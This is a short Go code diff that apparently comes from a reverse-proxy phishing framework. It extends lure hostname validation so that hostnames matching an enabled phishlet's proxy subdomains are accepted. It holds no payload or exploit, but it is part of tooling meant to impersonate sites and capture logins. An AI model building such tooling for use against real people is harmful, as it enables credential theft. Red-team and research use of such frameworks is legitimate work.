@@ -641,6 +641,20 @@ func (c *Config) IsLureHostnameValid(hostname string) bool {
 			}
 		}
 	}
+	// Also check if hostname matches any enabled phishlet's proxy host
+	for site, pl := range c.phishlets {
+		if c.IsSiteEnabled(site) {
+			phishDomain, ok := c.GetSiteDomain(pl.Name)
+			if !ok {
+				continue
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+					return true
+				}
+			}
+		}
+	}
 	return false
 }
 
